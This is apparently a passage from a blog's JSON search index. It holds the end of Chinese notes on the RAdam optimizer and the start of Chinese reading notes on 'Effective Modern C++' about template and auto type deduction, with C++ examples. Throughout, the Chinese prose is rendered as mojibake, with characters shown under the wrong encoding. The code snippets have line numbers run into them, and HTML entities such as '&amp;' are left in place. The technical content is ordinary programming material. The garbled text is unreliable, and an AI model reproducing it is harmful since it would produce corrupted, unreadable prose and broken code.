å¹¶ä¸èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¹Ÿä¸æ˜¯ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜çš„ã€‚ æ‰€ä»¥ RAdam è®¾è®¡äº†å‚æ•° \\(\\rho_t, \\rho_{\\infty}\\) ã€‚ \\(\\rho_{\\infty}\\) å¾ˆå¤§ï¼Œè€Œ \\(\\rho_t\\) é€æ¸å¢å¤§è¶‹äº \\(\\rho_{\\infty}\\)ã€‚ æ ¹æ® \\(\\rho_t\\) çš„å¤§å°ï¼Œè°ƒæ•´å‚æ•°æ›´æ–°ç­–ç•¥ã€‚å…ˆæ˜¯ momentum æ–¹å¼ï¼Œåªè€ƒè™‘ä¸€é˜¶åŠ¨é‡ï¼›å½“ \\(\\rho_t\\) è¾¾åˆ°ä¸€å®šå¤§å°ï¼Œå†è¿›è¡Œ RAdam æ–¹å¼æ›´æ–°ã€‚ RAdam æ–¹å¼ç›¸è¾ƒäº Adamï¼Œå¤šäº†ä¸€ä¸ªéštime stepé€æ¸å¢å¤§çš„å‚æ•° \\(r_t\\) å’Œå­¦ä¹ ç‡ä¸€èµ·ä½œç”¨äºæƒé‡å‚æ•°çš„æ›´æ–°è¿‡ç¨‹ã€‚ ç”šè‡³æœ‰ç‚¹warm-upçš„å‘³é“äº†ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"optimizer","slug":"optimizer","permalink":"https://racleray.github.io/tags/optimizer/"},{"name":"lookahead","slug":"lookahead","permalink":"https://racleray.github.io/tags/lookahead/"}],"author":"HeRui"},{"title":"Effective Modern Cpp","slug":"Effective-Modern-Cpp","date":"2022-04-12T13:00:52.000Z","updated":"2024-01-09T10:23:43.747Z","comments":true,"path":"posts/b3d88a54.html","link":"","permalink":"https://racleray.github.io/posts/b3d88a54.html","excerpt":"Effective Modern Cpp è¯»ä¹¦ç¬”è®°","text":"ä¸ºä»€ä¹ˆconstæˆå‘˜å‡½æ•°åº”å½“çº¿ç¨‹å®‰å…¨ï¼Ÿæ€æ ·ä½¿ç”¨std::unique_ptrå®ç°Pimplæƒ¯ç”¨æ³•ï¼Ÿä¸ºä½•è¦é¿å…lambdaè¡¨è¾¾å¼ç”¨é»˜è®¤æ•è·æ¨¡å¼ï¼Ÿstd::atomicä¸volatileçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ åŸºç¡€ç®€ä»‹ C++ä¸­çš„è®¸å¤šä¸œè¥¿éƒ½å¯è¢«å£°æ˜å’Œå®šä¹‰ã€‚å£°æ˜ï¼ˆdeclarationsï¼‰å¼•å…¥åå­—å’Œç±»å‹ï¼Œå¹¶ä¸ç»™å‡ºæ¯”å¦‚å­˜æ”¾åœ¨å“ªæˆ–è€…æ€æ ·å®ç°ç­‰çš„ç»†èŠ‚ï¼š 1234567extern int x; //å¯¹è±¡å£°æ˜class Widget; //ç±»å£°æ˜bool func(const Widget&amp; w); //å‡½æ•°å£°æ˜enum class Color; //é™åŸŸenumå£°æ˜ å®šä¹‰ï¼ˆdefinitionsï¼‰æä¾›å­˜å‚¨ä½ç½®æˆ–è€…å®ç°ç»†èŠ‚ï¼š 1234567891011int x; //å¯¹è±¡å®šä¹‰class Widget &#123; //ç±»å®šä¹‰ â€¦&#125;;bool func(const Widget&amp; w)&#123; return w.size() &lt; 10; &#125; //å‡½æ•°å®šä¹‰enum class Color&#123; Yellow, Red, Blue &#125;; //é™åŸŸenumå®šä¹‰ å®šä¹‰ä¹Ÿæœ‰èµ„æ ¼ç§°ä¸ºå£°æ˜ã€‚ å®šä¹‰ä¸€ä¸ªå‡½æ•°çš„ç­¾åï¼ˆsignatureï¼‰ä¸ºå®ƒå£°æ˜çš„ä¸€éƒ¨åˆ†ï¼Œè¿™ä¸ªå£°æ˜æŒ‡å®šäº†å½¢å‚ç±»å‹å’Œè¿”å›ç±»å‹ã€‚å‡½æ•°åå’Œå½¢å‚åä¸æ˜¯ç­¾åçš„ä¸€éƒ¨åˆ†ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œfuncçš„ç­¾åæ˜¯bool(const Widget&amp;)ã€‚å‡½æ•°å£°æ˜ä¸­é™¤äº†å½¢å‚ç±»å‹å’Œè¿”å›ç±»å‹ä¹‹å¤–çš„å…ƒç´ ï¼ˆæ¯”å¦‚noexceptæˆ–è€…constexprï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼‰éƒ½è¢«æ’é™¤åœ¨å¤–ã€‚ å¦å¤– std::auto_ptråœ¨C++11ä¸­è¢«åºŸå¼ƒï¼Œå› ä¸ºstd::unique_ptrå¯ä»¥åšåŒæ ·çš„å·¥ä½œï¼Œè€Œä¸”åªä¼šåšçš„æ›´å¥½ã€‚ å¦‚æœä¸€ä¸ªæ“ä½œçš„ç»“æœæœ‰æœªå®šä¹‰çš„è¡Œä¸ºï¼ˆundefined behaviorï¼‰ã€‚è¿™æ„å‘³ç€è¿è¡Œæ—¶è¡¨ç°æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚æ¯”å¦‚ï¼Œåœ¨std::vectorèŒƒå›´å¤–ä½¿ç”¨æ–¹æ‹¬å·ï¼ˆâ€œ[]â€ï¼‰ï¼Œè§£å¼•ç”¨æœªåˆå§‹åŒ–çš„è¿­ä»£å™¨ï¼Œæˆ–è€…æ•°æ®ç«äº‰ï¼ˆå³æœ‰ä¸¤ä¸ªæˆ–ä»¥ä¸Šçº¿ç¨‹ï¼Œè‡³å°‘ä¸€ä¸ªæ˜¯writerï¼ŒåŒæ—¶è®¿é—®ç›¸åŒçš„å†…å­˜ä½ç½®ï¼‰ã€‚ è¿˜æœ‰ï¼Œæ™ºèƒ½æŒ‡é’ˆé€šå¸¸é‡è½½æŒ‡é’ˆè§£å¼•ç”¨è¿ç®—ç¬¦ï¼ˆoperator-&gt;å’Œoperator*ï¼‰ï¼Œä½† std::weak_ptræ˜¯ä¸ªä¾‹å¤–ã€‚ 1 ç±»å‹æ¨å¯¼ C++11ä¿®æ”¹äº†ä¸€äº›ç±»å‹æ¨å¯¼è§„åˆ™å¹¶å¢åŠ äº†ä¸¤å¥—è§„åˆ™ï¼Œä¸€å¥—ç”¨äºautoï¼Œä¸€å¥—ç”¨äºdecltypeã€‚C++14æ‰©å±•äº†autoå’Œdecltypeå¯èƒ½ä½¿ç”¨çš„èŒƒå›´ã€‚ æ¡æ¬¾1ï¼šç†è§£æ¨¡æ¿ç±»å‹æ¨å¯¼ C++æœ€é‡è¦æœ€å¸å¼•äººçš„ç‰¹æ€§autoæ˜¯å»ºç«‹åœ¨æ¨¡æ¿ç±»å‹æ¨å¯¼çš„åŸºç¡€ä¸Šçš„ã€‚ è€ƒè™‘åƒè¿™æ ·ä¸€ä¸ªå‡½æ•°æ¨¡æ¿ï¼š 12template&lt;typename T&gt;void f(ParamType param); æ›´å…·ä½“ä¸€ç‚¹æ˜¯ï¼š 12template&lt;typename T&gt;void f(const T&amp; param); //ParamTypeæ˜¯const T&amp; ç¼–è¯‘å™¨å¯¹ f å‡½æ•°çš„å‚æ•°è¿›è¡Œä¸¤ä¸ªç±»å‹æ¨å¯¼ï¼šä¸€ä¸ªæ˜¯é’ˆå¯¹Tçš„ï¼Œå¦ä¸€ä¸ªæ˜¯é’ˆå¯¹ParamTypeçš„ã€‚è¿™ä¸¤ä¸ªç±»å‹é€šå¸¸æ˜¯ä¸åŒçš„ï¼Œå› ä¸ºParamTypeåŒ…å«ä¸€äº›ä¿®é¥°ï¼Œæ¯”å¦‚constå’Œå¼•ç”¨ä¿®é¥°ç¬¦ã€‚ ç„¶åè¿™æ ·è¿›è¡Œè°ƒç”¨ï¼š 12int x = 0;f(x); //ç”¨ä¸€ä¸ªintç±»å‹çš„å˜é‡è°ƒç”¨f Tè¢«æ¨å¯¼ä¸ºintï¼ŒParamTypeå´è¢«æ¨å¯¼ä¸ºconst int&amp;ã€‚ Tçš„ç±»å‹æ¨å¯¼ä¸ä»…å–å†³äºexprçš„ç±»å‹ï¼Œä¹Ÿå–å†³äºParamTypeçš„ç±»å‹ã€‚æœ‰ä¸‰ç§æƒ…å†µï¼š ParamTypeæ˜¯ä¸€ä¸ªæŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œä½†ä¸æ˜¯é€šç”¨å¼•ç”¨ï¼ˆå‚è§ Item24ï¼Œå®ƒä¸åŒäºå·¦å€¼å¼•ç”¨å’Œå³å€¼å¼•ç”¨ï¼‰ ParamTypeæ˜¯ä¸€ä¸ªé€šç”¨å¼•ç”¨ ParamTypeæ—¢ä¸æ˜¯æŒ‡é’ˆä¹Ÿä¸æ˜¯å¼•ç”¨ ParamTypeæ˜¯ä¸€ä¸ªæŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œä½†ä¸æ˜¯é€šç”¨å¼•ç”¨ f(expr) çš„ç±»å‹æ¨å¯¼ä¼šè¿™æ ·è¿›è¡Œï¼š å¦‚æœexprçš„ç±»å‹æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œå¿½ç•¥å¼•ç”¨éƒ¨åˆ† ç„¶åexprçš„ç±»å‹ä¸ParamTypeè¿›è¡Œæ¨¡å¼åŒ¹é…æ¥å†³å®šT å¦‚æœè¿™æ˜¯æˆ‘ä»¬çš„æ¨¡æ¿ï¼Œ 12template&lt;typename T&gt;void f(T&amp; param); //paramæ˜¯ä¸€ä¸ªå¼•ç”¨ æˆ‘ä»¬å£°æ˜è¿™äº›å˜é‡ï¼Œ 123int x=27; //xæ˜¯intconst int cx=x; //cxæ˜¯const intconst int&amp; rx=x; //rxæ˜¯æŒ‡å‘ä½œä¸ºconst intçš„xçš„å¼•ç”¨ åœ¨ä¸åŒçš„è°ƒç”¨ä¸­ï¼Œå¯¹paramå’ŒTæ¨å¯¼çš„ç±»å‹ä¼šæ˜¯è¿™æ ·ï¼š 123f(x); //Tæ˜¯intï¼Œparamçš„ç±»å‹æ˜¯int&amp;f(cx); //Tæ˜¯const intï¼Œparamçš„ç±»å‹æ˜¯const int&amp;f(rx); //Tæ˜¯const intï¼Œparamçš„ç±»å‹æ˜¯const int&amp; å³ä½¿rxçš„ç±»å‹æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼ŒTä¹Ÿä¼šè¢«æ¨å¯¼ä¸ºä¸€ä¸ªéå¼•ç”¨ ï¼Œè¿™æ˜¯å› ä¸ºrxçš„å¼•ç”¨æ€§ï¼ˆreference-nessï¼‰åœ¨ç±»å‹æ¨å¯¼ä¸­ä¼šè¢«å¿½ç•¥ã€‚ å½“paramæ˜¯reference-to-constï¼Œconstä¸å†è¢«æ¨å¯¼ä¸ºTçš„ä¸€éƒ¨åˆ†ï¼š 12345678910template&lt;typename T&gt;void f(const T&amp; param); //paramç°åœ¨æ˜¯reference-to-constint x = 27; //å¦‚ä¹‹å‰ä¸€æ ·const int cx = x; //å¦‚ä¹‹å‰ä¸€æ ·const int&amp; rx = x; //å¦‚ä¹‹å‰ä¸€æ ·f(x); //Tæ˜¯intï¼Œparamçš„ç±»å‹æ˜¯const int&amp;f(cx); //Tæ˜¯intï¼Œparamçš„ç±»å‹æ˜¯const int&amp;f(rx); //Tæ˜¯intï¼Œparamçš„ç±»å‹æ˜¯const int&amp; åŒä¹‹å‰ä¸€æ ·ï¼Œrxçš„reference-nessåœ¨ç±»å‹æ¨å¯¼ä¸­è¢«å¿½ç•¥äº†ã€‚ å¦‚æœparamæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ˆæˆ–è€…æŒ‡å‘constçš„æŒ‡é’ˆï¼‰è€Œä¸æ˜¯å¼•ç”¨ï¼Œæƒ…å†µæœ¬è´¨ä¸Šä¹Ÿä¸€æ ·ï¼š 12345678template&lt;typename T&gt;void f(T* param); //paramç°åœ¨æ˜¯æŒ‡é’ˆint x = 27; //åŒä¹‹å‰ä¸€æ ·const int *px = &amp;x; //pxæ˜¯æŒ‡å‘ä½œä¸ºconst intçš„xçš„æŒ‡é’ˆf(&amp;x); //Tæ˜¯intï¼Œparamçš„ç±»å‹æ˜¯int*f(px); //Tæ˜¯const intï¼Œparamçš„ç±»å‹æ˜¯const int* ParamTypeæ˜¯ä¸€ä¸ªé€šç”¨å¼•ç”¨ å½¢å‚è¢«å£°æ˜ä¸ºåƒå³å€¼å¼•ç”¨ä¸€æ ·ï¼ˆä¹Ÿå°±æ˜¯ï¼Œåœ¨å‡½æ•°æ¨¡æ¿ä¸­å‡è®¾æœ‰ä¸€ä¸ªç±»å‹å½¢å‚Tï¼Œé‚£ä¹ˆé€šç”¨å¼•ç”¨å£°æ˜å½¢å¼å°±æ˜¯T&amp;&amp;)ã€‚ å¦‚æœexpræ˜¯å·¦å€¼ï¼ŒTå’ŒParamTypeéƒ½ä¼šè¢«æ¨å¯¼ä¸ºå·¦å€¼å¼•ç”¨ã€‚ è¿™æ˜¯æ¨¡æ¿ç±»å‹æ¨å¯¼ä¸­å”¯ä¸€ä¸€ç§Tè¢«æ¨å¯¼ä¸ºå¼•ç”¨çš„æƒ…å†µã€‚ è™½ç„¶ParamTypeè¢«å£°æ˜ä¸ºå³å€¼å¼•ç”¨ç±»å‹ï¼Œä½†æ˜¯æœ€åæ¨å¯¼çš„ç»“æœæ˜¯å·¦å€¼å¼•ç”¨ã€‚ å¦‚æœexpræ˜¯å³å€¼ï¼Œå°±ä½¿ç”¨æ­£å¸¸çš„ï¼ˆä¹Ÿå°±æ˜¯ä¸Šä¸€èŠ‚ä¸­çš„ï¼‰æ¨å¯¼è§„åˆ™ 123456789101112131415161718template&lt;typename T&gt;void f(T&amp;&amp; param); //paramç°åœ¨æ˜¯ä¸€ä¸ªé€šç”¨å¼•ç”¨ç±»å‹ int x=27; const int cx=x; const int &amp; rx=cx; f(x); //xæ˜¯å·¦å€¼ï¼Œæ‰€ä»¥Tæ˜¯int&amp;ï¼Œ //paramç±»å‹ä¹Ÿæ˜¯int&amp;f(cx); //cxæ˜¯å·¦å€¼ï¼Œæ‰€ä»¥Tæ˜¯const int&amp;ï¼Œ //paramç±»å‹ä¹Ÿæ˜¯const int&amp;f(rx); //rxæ˜¯å·¦å€¼ï¼Œæ‰€ä»¥Tæ˜¯const int&amp;ï¼Œ //paramç±»å‹ä¹Ÿæ˜¯const int&amp;f(27); //27æ˜¯å³å€¼ï¼Œæ‰€ä»¥Tæ˜¯intï¼Œ //paramç±»å‹å°±æ˜¯int&amp;&amp; é€šç”¨å¼•ç”¨çš„ç±»å‹æ¨å¯¼è§„åˆ™æ˜¯ä¸åŒäºæ™®é€šçš„å·¦å€¼æˆ–è€…å³å€¼å¼•ç”¨çš„ã€‚å°¤å…¶æ˜¯ï¼Œå½“é€šç”¨å¼•ç”¨è¢«ä½¿ç”¨æ—¶ï¼Œç±»å‹æ¨å¯¼ä¼šåŒºåˆ†å·¦å€¼å®å‚å’Œå³å€¼å®å‚ï¼Œä½†æ˜¯å¯¹éé€šç”¨å¼•ç”¨æ—¶ä¸ä¼šåŒºåˆ†ã€‚ ParamTypeæ—¢ä¸æ˜¯æŒ‡é’ˆä¹Ÿä¸æ˜¯å¼•ç”¨ å½“ParamTypeæ—¢ä¸æ˜¯æŒ‡é’ˆä¹Ÿä¸æ˜¯å¼•ç”¨æ—¶ï¼Œæˆ‘ä»¬é€šè¿‡ä¼ å€¼ï¼ˆpass-by-valueï¼‰çš„æ–¹å¼å¤„ç†ï¼š 12template&lt;typename T&gt;void f(T param); //ä»¥ä¼ å€¼çš„æ–¹å¼å¤„ç†param è¿™æ„å‘³ç€æ— è®ºä¼ é€’ä»€ä¹ˆparaméƒ½ä¼šæˆä¸ºå®ƒçš„ä¸€ä»½æ‹·è´â€”â€”ä¸€ä¸ªå®Œæ•´çš„æ–°å¯¹è±¡ã€‚äº‹å®ä¸Šparamæˆä¸ºä¸€ä¸ªæ–°å¯¹è±¡è¿™ä¸€è¡Œä¸ºä¼šå½±å“Tå¦‚ä½•ä»exprä¸­æ¨å¯¼å‡ºç»“æœã€‚ å¦‚æœexprçš„ç±»å‹æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œå¿½ç•¥è¿™ä¸ªå¼•ç”¨éƒ¨åˆ† å¦‚æœå¿½ç•¥exprçš„å¼•ç”¨æ€§ï¼ˆreference-nessï¼‰ä¹‹åï¼Œexpræ˜¯ä¸€ä¸ªconstï¼Œé‚£å°±å†å¿½ç•¥constã€‚å¦‚æœå®ƒæ˜¯volatileï¼Œä¹Ÿå¿½ç•¥volatileï¼ˆvolatileå¯¹è±¡ä¸å¸¸è§ï¼Œå®ƒé€šå¸¸ç”¨äºé©±åŠ¨ç¨‹åºçš„å¼€å‘ä¸­ï¼‰ å› æ­¤ï¼š 1234567int x=27; //å¦‚ä¹‹å‰ä¸€æ ·const int cx=x; //å¦‚ä¹‹å‰ä¸€æ ·const int &amp; rx=cx; //å¦‚ä¹‹å‰ä¸€æ ·f(x); //Tå’Œparamçš„ç±»å‹éƒ½æ˜¯intf(cx); //Tå’Œparamçš„ç±»å‹éƒ½æ˜¯intf(rx); //Tå’Œparamçš„ç±»å‹éƒ½æ˜¯int å³ä½¿cxå’Œrxè¡¨ç¤ºconstå€¼ï¼Œparamä¹Ÿä¸æ˜¯constã€‚è¿™æ˜¯æœ‰æ„ä¹‰çš„ã€‚paramæ˜¯ä¸€ä¸ªå®Œå…¨ç‹¬ç«‹äºcxå’Œrxçš„å¯¹è±¡â€”â€”æ˜¯cxæˆ–rxçš„ä¸€ä¸ªæ‹·è´ã€‚ è®¤è¯†åˆ°åªæœ‰åœ¨ä¼ å€¼ç»™å½¢å‚æ—¶æ‰ä¼šå¿½ç•¥constï¼ˆå’Œvolatileï¼‰è¿™ä¸€ç‚¹å¾ˆé‡è¦ã€‚å¯¹äºreference-to-constå’Œpointer-to-constå½¢å‚æ¥è¯´ï¼Œexprçš„å¸¸é‡æ€§constnessåœ¨æ¨å¯¼æ—¶ä¼šè¢«ä¿ç•™ã€‚ ä¾‹å¦‚ï¼š 1234567template&lt;typename T&gt;void f(T param); //ä»ç„¶ä»¥ä¼ å€¼çš„æ–¹å¼å¤„ç†paramconst char* const ptr = //ptræ˜¯ä¸€ä¸ªå¸¸é‡æŒ‡é’ˆï¼ŒæŒ‡å‘å¸¸é‡å¯¹è±¡ \"Fun with pointers\";f(ptr); //ä¼ é€’const char * constç±»å‹çš„å®å‚ å½“pträ½œä¸ºå®å‚ä¼ ç»™fï¼Œç»„æˆè¿™ä¸ªæŒ‡é’ˆçš„æ¯ä¸€æ¯”ç‰¹éƒ½è¢«æ‹·è´è¿›paramã€‚ptrè‡ªèº«çš„å€¼ä¼šè¢«ä¼ ç»™å½¢å‚ã€‚ åœ¨ç±»å‹æ¨å¯¼ä¸­ï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„æ•°æ®çš„å¸¸é‡æ€§constnesså°†ä¼šè¢«ä¿ç•™ï¼Œä½†æ˜¯å½“æ‹·è´ptræ¥åˆ›é€ ä¸€ä¸ªæ–°æŒ‡é’ˆparamæ—¶ï¼Œptrè‡ªèº«çš„å¸¸é‡æ€§constnesså°†ä¼šè¢«å¿½ç•¥ã€‚ æ•°ç»„å®å‚ 123const char name[] = \"J. P. Briggs\"; //nameçš„ç±»å‹æ˜¯const char[13]const char * ptrToName = name; //æ•°ç»„é€€åŒ–ä¸ºæŒ‡é’ˆ åœ¨è¿™é‡Œconst char*æŒ‡é’ˆptrToNameä¼šç”±nameåˆå§‹åŒ–ï¼Œè€Œnameçš„ç±»å‹ä¸ºconst char[13]ï¼Œè¿™ä¸¤ç§ç±»å‹ï¼ˆconst char*å’Œconst char[13]ï¼‰æ˜¯ä¸ä¸€æ ·çš„ï¼Œä½†æ˜¯ç”±äºæ•°ç»„é€€åŒ–ä¸ºæŒ‡é’ˆçš„è§„åˆ™ï¼Œç¼–è¯‘å™¨å…è®¸è¿™æ ·çš„ä»£ç ã€‚ ä½†è¦æ˜¯ä¸€ä¸ªæ•°ç»„ä¼ å€¼ç»™ä¸€ä¸ªæ¨¡æ¿ä¼šæ€æ ·ï¼Ÿä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ 1234template&lt;typename T&gt;void f(T param); //ä¼ å€¼å½¢å‚çš„æ¨¡æ¿f(name); //Tå’Œparamä¼šæ¨å¯¼æˆä»€ä¹ˆç±»å‹? æ•°ç»„ä¸æŒ‡é’ˆå½¢å‚è¿™æ ·çš„ç­‰ä»·æ˜¯Cè¯­è¨€çš„äº§ç‰©ï¼ŒC++åˆæ˜¯å»ºç«‹åœ¨Cè¯­è¨€çš„åŸºç¡€ä¸Šï¼Œå®ƒè®©äººäº§ç”Ÿäº†ä¸€ç§æ•°ç»„å’ŒæŒ‡é’ˆæ˜¯ç­‰ä»·çš„çš„é”™è§‰ã€‚ å› ä¸ºæ•°ç»„å½¢å‚ä¼šè§†ä½œæŒ‡é’ˆå½¢å‚ï¼Œæ‰€ä»¥ä¼ å€¼ç»™æ¨¡æ¿çš„ä¸€ä¸ªæ•°ç»„ç±»å‹ä¼šè¢«æ¨å¯¼ä¸ºä¸€ä¸ªæŒ‡é’ˆç±»å‹ã€‚è¿™æ„å‘³ç€åœ¨æ¨¡æ¿å‡½æ•°fçš„è°ƒç”¨ä¸­ï¼Œå®ƒçš„ç±»å‹å½¢å‚Tä¼šè¢«æ¨å¯¼ä¸ºconst char*ï¼š 1f(name); //nameæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä½†æ˜¯Tè¢«æ¨å¯¼ä¸ºconst char* ä½†æ˜¯åœ¨C++ä¸­ï¼Œè™½ç„¶å‡½æ•°ä¸èƒ½å£°æ˜å½¢å‚ä¸ºçœŸæ­£çš„æ•°ç»„ï¼Œä½†æ˜¯å¯ä»¥æ¥å—æŒ‡å‘æ•°ç»„çš„å¼•ç”¨ï¼æ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹fä¸ºä¼ å¼•ç”¨ï¼š 12template&lt;typename T&gt;void f(T&amp; param); //ä¼ å¼•ç”¨å½¢å‚çš„æ¨¡æ¿ æˆ‘ä»¬è¿™æ ·è¿›è¡Œè°ƒç”¨ï¼Œ 1f(name); //ä¼ æ•°ç»„ç»™f Tè¢«æ¨å¯¼ä¸ºäº†çœŸæ­£çš„æ•°ç»„ï¼è¿™ä¸ªç±»å‹åŒ…æ‹¬äº†æ•°ç»„çš„å¤§å°ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­Tè¢«æ¨å¯¼ä¸ºconst char[13]ï¼Œfçš„å½¢å‚ï¼ˆå¯¹è¿™ä¸ªæ•°ç»„çš„å¼•ç”¨ï¼‰çš„ç±»å‹åˆ™ä¸ºconst char (&amp;)[13]ã€‚ å¯å£°æ˜æŒ‡å‘æ•°ç»„çš„å¼•ç”¨çš„èƒ½åŠ›ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¨¡æ¿å‡½æ•°æ¥æ¨å¯¼å‡ºæ•°ç»„çš„å¤§å°ï¼š 12345//åœ¨ç¼–è¯‘æœŸé—´è¿”å›ä¸€ä¸ªæ•°ç»„å¤§å°çš„å¸¸é‡å€¼ï¼Œè¿™é‡Œçš„æ•°ç»„å½¢å‚æ²¡æœ‰åå­—template&lt;typename T, std::size_t N&gt; constexpr std::size_t arraySize(T (&amp;)[N]) noexcept &#123; return N; &#125; å°†ä¸€ä¸ªå‡½æ•°å£°æ˜ä¸ºconstexprä½¿å¾—ç»“æœåœ¨ç¼–è¯‘æœŸé—´å¯ç”¨ã€‚è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªèŠ±æ‹¬å·å£°æ˜ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åç¬¬äºŒä¸ªæ•°ç»„å¯ä»¥ä½¿ç”¨ç¬¬ä¸€ä¸ªæ•°ç»„çš„å¤§å°ä½œä¸ºå®ƒçš„å¤§å°ï¼Œå°±åƒè¿™æ ·ï¼š 123int keyVals[] = &#123; 1, 3, 7, 9, 11, 22, 35 &#125;; //keyValsæœ‰ä¸ƒä¸ªå…ƒç´ int mappedVals[arraySize(keyVals)]; //mappedValsä¹Ÿæœ‰ä¸ƒä¸ª å½“ç„¶ä½œä¸ºä¸€ä¸ªç°ä»£C++ç¨‹åºå‘˜ï¼Œä½ è‡ªç„¶åº”è¯¥æƒ³åˆ°ä½¿ç”¨std::arrayè€Œä¸æ˜¯å†…ç½®çš„æ•°ç»„ï¼š 1std::array&lt;int, arraySize(keyVals)&gt; mappedVals; //mappedValsçš„å¤§å°ä¸º7 è‡³äºarraySizeè¢«å£°æ˜ä¸ºnoexceptï¼Œä¼šä½¿å¾—ç¼–è¯‘å™¨ç”Ÿæˆæ›´å¥½çš„ä»£ç ã€‚ å‡½æ•°å®å‚ åœ¨C++ä¸­ä¸åªæ˜¯æ•°ç»„ä¼šé€€åŒ–ä¸ºæŒ‡é’ˆï¼Œå‡½æ•°ç±»å‹ä¹Ÿä¼šé€€åŒ–ä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚å¯¹äºæ•°ç»„ç±»å‹æ¨å¯¼çš„å…¨éƒ¨è®¨è®ºéƒ½å¯ä»¥åº”ç”¨åˆ°å‡½æ•°ç±»å‹æ¨å¯¼å’Œé€€åŒ–ä¸ºå‡½æ•°æŒ‡é’ˆä¸Šæ¥ã€‚ç»“æœæ˜¯ï¼š 12345678910111213void someFunc(int, double); //someFuncæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œ //ç±»å‹æ˜¯void(int, double)template&lt;typename T&gt;void f1(T param); //ä¼ å€¼ç»™f1template&lt;typename T&gt;void f2(T &amp; param); //ä¼ å¼•ç”¨ç»™f2f1(someFunc); //paramè¢«æ¨å¯¼ä¸ºæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆï¼Œ //ç±»å‹æ˜¯void(*)(int, double)f2(someFunc); //paramè¢«æ¨å¯¼ä¸ºæŒ‡å‘å‡½æ•°çš„å¼•ç”¨ï¼Œ //ç±»å‹æ˜¯void(&amp;)(int, double) è¿™ä¸ªå®é™…ä¸Šæ²¡æœ‰ä»€ä¹ˆä¸åŒï¼Œåªæ˜¯å‡½æ•°é€€åŒ–ä¸ºæŒ‡é’ˆã€‚ ç»“è®º åœ¨æ¨¡æ¿ç±»å‹æ¨å¯¼æ—¶ï¼Œæœ‰å¼•ç”¨çš„å®å‚ä¼šè¢«è§†ä¸ºæ— å¼•ç”¨ï¼Œå¼•ç”¨ä¼šè¢«å¿½ç•¥ å¯¹äºé€šç”¨å¼•ç”¨çš„æ¨å¯¼ï¼Œå·¦å€¼å®å‚ä¼šè¢«ç‰¹æ®Šå¯¹å¾… å¯¹äºä¼ å€¼ç±»å‹æ¨å¯¼ï¼Œconstå’Œ/æˆ–volatileå®å‚ä¼šè¢«è®¤ä¸ºæ˜¯non-constçš„å’Œnon-volatileçš„ åœ¨æ¨¡æ¿ç±»å‹æ¨å¯¼æ—¶ï¼Œæ•°ç»„åæˆ–è€…å‡½æ•°åå®å‚ä¼šé€€åŒ–ä¸ºæŒ‡é’ˆï¼Œé™¤éå®ƒä»¬è¢«ç”¨äºåˆå§‹åŒ–å¼•ç”¨æ¨¡æ¿å‚æ•°ç±»å‹ã€‚ 2 ç†è§£ auto ç±»å‹æ¨å¯¼ æ¨¡æ¿ç±»å‹æ¨å¯¼ä½¿ç”¨ä¸‹é¢è¿™ä¸ªå‡½æ•°æ¨¡æ¿ 1234template&lt;typename T&gt;void f(ParmaType param);f(expr); //ä½¿ç”¨ä¸€äº›è¡¨è¾¾å¼è°ƒç”¨f åœ¨fçš„è°ƒç”¨ä¸­ï¼Œç¼–è¯‘å™¨ä½¿ç”¨expræ¨å¯¼Tå’ŒParamTypeçš„ç±»å‹ã€‚ å½“ä¸€ä¸ªå˜é‡ä½¿ç”¨autoè¿›è¡Œå£°æ˜æ—¶ï¼Œautoæ‰®æ¼”äº†æ¨¡æ¿ä¸­Tçš„è§’è‰²ï¼Œå˜é‡çš„ç±»å‹è¯´æ˜ç¬¦æ‰®æ¼”äº†ParamTypeçš„è§’è‰²ã€‚ è€ƒè™‘è¿™ä¸ªä¾‹å­ï¼š 1auto x = 27; è¿™é‡Œxçš„ç±»å‹è¯´æ˜ç¬¦æ˜¯autoè‡ªå·±ï¼Œå¦ä¸€æ–¹é¢ï¼Œåœ¨è¿™ä¸ªå£°æ˜ä¸­ï¼š 1const auto cx = x; ç±»å‹è¯´æ˜ç¬¦æ˜¯const autoã€‚å¦ä¸€ä¸ªï¼š 1const auto &amp; rx=cx; ç±»å‹è¯´æ˜ç¬¦æ˜¯const auto&amp;ã€‚ åœ¨è¿™é‡Œä¾‹å­ä¸­è¦æ¨å¯¼xï¼Œrxå’Œcxçš„ç±»å‹ï¼Œç¼–è¯‘å™¨çš„è¡Œä¸ºçœ‹èµ·æ¥å°±åƒæ˜¯è®¤ä¸ºè¿™é‡Œæ¯ä¸ªå£°æ˜éƒ½æœ‰ä¸€ä¸ªæ¨¡æ¿ï¼Œç„¶åä½¿ç”¨åˆé€‚çš„åˆå§‹åŒ–è¡¨è¾¾å¼è¿›è¡Œè°ƒç”¨ï¼š 1234567891011121314151617template&lt;typename T&gt; //æ¦‚å¿µåŒ–çš„æ¨¡æ¿ç”¨æ¥æ¨å¯¼xçš„ç±»å‹void func_for_x(T param);func_for_x(27); //æ¦‚å¿µåŒ–è°ƒç”¨ï¼š //paramçš„æ¨å¯¼ç±»å‹æ˜¯xçš„ç±»å‹template&lt;typename T&gt; 